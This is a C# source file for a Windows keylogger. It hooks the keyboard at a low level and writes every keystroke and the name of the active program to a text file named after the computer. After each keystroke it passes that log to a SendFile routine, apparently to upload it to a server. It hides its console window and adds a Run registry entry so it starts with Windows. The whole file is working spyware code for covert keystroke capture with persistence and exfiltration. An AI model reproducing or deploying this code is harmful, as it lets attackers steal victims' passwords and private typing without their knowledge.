using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    public class KeyLogger
    {        
        #region Hook Key Board
        private const int WH_KEYBOARD_LL = 13;  //key board(up)
        private const int WM_KEYDOWN = 0x0100;  //key down

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;    //handle

        private static string logName = Client.strComputerName+"_";       // name computer
        private static string logExtendtion =".txt";                      // .txt

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);       

        [DllImport("User32.dll")]
        private static extern bool GetAsyncKeyState(int k);
        [DllImport("User32.dll")]
        private static extern bool GetKeyState(int k);

        static readonly Client a = new Client();
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        //Set Hook into all current process
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void WriteLog(int vkCode)  //create file txt add convert content about sever
        {
            bool GetCapsOn = GetKeyState((int)System.Windows.Forms.Keys.Capital);
            bool GetShiftOn = GetAsyncKeyState((int)System.Windows.Forms.Keys.ShiftKey);
            string logNameToWrite = logName + DateTime.Now.ToString("dd.MM.yyyy") + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write(CapKeys(vkCode, GetCapsOn, GetShiftOn));
            sw.Close();
            string workingDirectory = Environment.CurrentDirectory;
            a.SendFile(workingDirectory, logName + DateTime.Now.ToString("dd.MM.yyyy") + logExtendtion);
        }

        private static string CapKeys(int key, bool iscaps, bool isshift)
        {
            string strkey ;
            //==================================
            // Non - character keys
            //==================================
            if (key == (int)System.Windows.Forms.Keys.D1 || key == (int)System.Windows.Forms.Keys.NumPad1)
            {
                if (!isshift) { strkey = "1"; } else { strkey = "!"; }
                return  strkey; 
            }
            if (key == (int)System.Windows.Forms.Keys.D2 || key == (int)System.Windows.Forms.Keys.NumPad2)
            {
                if (!isshift) { strkey = "2"; } else { strkey = "@"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D3 || key == (int)System.Windows.Forms.Keys.NumPad3)
            {
                if (!isshift) { strkey = "3"; } else { strkey = "#"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D4 || key == (int)System.Windows.Forms.Keys.NumPad4)
            {
                if (!isshift) { strkey = "4"; } else { strkey = "$"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D5 || key == (int)System.Windows.Forms.Keys.NumPad5)
            {
                if (!isshift) { strkey = "5"; } else { strkey = "%"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D6 || key == (int)System.Windows.Forms.Keys.NumPad6)
            {
                if (!isshift) { strkey = "6"; } else { strkey = "^"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D7 || key == (int)System.Windows.Forms.Keys.NumPad7)
            {
                if (!isshift) { strkey = "7"; } else { strkey = "&"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D8 || key == (int)System.Windows.Forms.Keys.NumPad8)
            {
                if (!isshift) { strkey = "8"; } else { strkey = "*"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D9 || key == (int)System.Windows.Forms.Keys.NumPad9)
            {
                if (!isshift) { strkey = "9"; } else { strkey = "("; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.D0 || key == (int)System.Windows.Forms.Keys.NumPad0)
            {
                if (!isshift) { strkey = "0"; } else { strkey = ")"; }
                return  strkey;  
            }

            if (key == (int)System.Windows.Forms.Keys.Oemcomma)
            {
                if (!isshift) { strkey = ","; } else { strkey = "<"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemPeriod)
            {
                if (!isshift) { strkey = "."; } else { strkey = ">"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemSemicolon)
            {
                if (!isshift) { strkey = ";"; } else { strkey = ":"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemQuotes)
            {
                if (!isshift) { strkey = "'"; } else { strkey = '"'.ToString(); }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemOpenBrackets)
            {
                if (!isshift) { strkey = "["; } else { strkey = "{"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemCloseBrackets)
            {
                if (!isshift) { strkey = "]"; } else { strkey = "}"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemMinus)
            {
                if (!isshift) { strkey = "-"; } else { strkey = "_"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Oemplus)
            {
                if (!isshift) { strkey = "="; } else { strkey = "+"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemBackslash)
            {
                if (!isshift) { strkey = @"\"; } else { strkey = "|"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Oemtilde)
            {
                if (!isshift) { strkey = "`"; } else { strkey = "~"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.OemQuestion)
            {
                if (!isshift) { strkey = "/"; } else { strkey = "?"; }
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Multiply)
            {
                strkey = "*";
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Add)
            {
                strkey = "+";
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Subtract)
            {
                strkey = "-";
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Divide)
            {
                strkey = "/";
                return  strkey;  
            }
            if (key == 110)// period on numpad
            {
                strkey = ".";
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Enter)// period on numpad
            {
                strkey = Environment.NewLine;
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Space)// period on numpad
            {
                strkey = " ";
                return  strkey;  
            }
            if (key == (int)System.Windows.Forms.Keys.Back)// period on numpad
            {
                strkey = "[backspace]";
                return  strkey;  
            }

            //==================================
            // Check for validity
            //==================================
            if (!System.Char.IsLetterOrDigit(Convert.ToChar(key)))
            {
                return null;
            }

            //==================================
            // Check for casing
            //==================================
            if (iscaps && isshift)
            {
                return  Convert.ToChar(key).ToString().ToLower();
            }
            else if (iscaps || isshift)
            {
                return  Convert.ToChar(key).ToString().ToUpper();
            }
            else
            {
                return  Convert.ToChar(key).ToString().ToLower();
            }


        }

        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID); 
        }
        #endregion

        #region GetProcessName
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private static void GetProcessName() //write processname to txt
        {

            string current = GetForegroundProcessName();
            string before_curent = "";

            while (true)
            {
                if (current != before_curent)
                {
                    before_curent = current;
                    if (current == "Idle" || current == "devenv") continue;
                    else
                    {
                        string logNameToWrite = logName + DateTime.Now.ToString("dd.MM.yyyy") + logExtendtion;
                        StreamWriter sw = new StreamWriter(logNameToWrite, true);
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine("(" + current + ")" + Environment.NewLine);
                        sw.Close();
                    }
                }
                current = GetForegroundProcessName();

            }
        }

        private static string GetForegroundProcessName()
        {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == null)
                return "Unknown";

            uint pid;
            GetWindowThreadProcessId(hwnd, out pid);

            foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
            {
                if (p.Id == pid)
                    return p.ProcessName;
            }

            return "Unknown";
        }
        #endregion

        #region Hide Window
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;


        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        #endregion

        #region Registry that open with window (Start with windown)
        static void StartWithOS()
        {
            a.GetName();
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch
            {
            }
        }
        #endregion
        static void Main(string[] args)
        {            
            StartWithOS();
            HideWindow();
            Thread getname = new Thread(GetProcessName);
            getname.Start();
            HookKeyboard();
        }
    }
}
